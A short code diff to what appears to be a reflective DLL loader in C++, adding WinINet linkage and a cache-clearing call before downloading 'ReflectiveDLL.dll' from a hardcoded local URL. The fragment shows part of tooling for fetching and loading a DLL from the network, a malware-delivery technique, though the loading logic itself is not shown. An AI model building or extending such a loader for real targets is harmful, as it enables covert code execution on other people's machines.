@@ -8,7 +8,9 @@
 #include <cwctype>
 #include <cctype>
 #pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "Wininet.lib")
 #include <urlmon.h>
+#include <wininet.h>
 
 #define		EXPORTED_FUNC_NAME		"ReflectiveFunction"
 #define     EXPORTED_PRE_LOADER     "CrazyLoader"
@@ -119,8 +121,8 @@ vector<char> downloadFromURL(IN LPCSTR url) {
 
 	IStream* stream;
 	vector<char> buffer;
-
-
+    //hardcoded for testing now
+    DeleteUrlCacheEntry(L"http://127.0.0.1/ReflectiveDLL.dll");
 	if (URLOpenBlockingStreamA(0, url, &stream, 0, 0))
 	{
 		cout << "[-] Error occured while downloading the file";
